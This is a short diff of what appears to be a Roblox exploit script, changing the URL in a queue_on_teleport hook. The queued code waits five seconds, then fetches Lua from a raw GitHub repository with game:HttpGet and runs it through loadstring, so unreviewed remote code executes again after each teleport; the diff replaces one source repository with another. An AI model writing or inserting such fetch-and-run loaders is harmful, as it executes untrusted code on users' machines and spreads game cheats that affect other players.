@@ -8,7 +8,7 @@ local char = plr.Character or plr.CharacterAdded:Wait()
 if queue_on_teleport then
 	queue_on_teleport([[
 		wait(5)
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/flickzzzzzzzzz/rovibeslixo/main/rovibespodre"))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Eras3fds/123/refs/heads/main/LOVE"))()
 	]])
 end
 
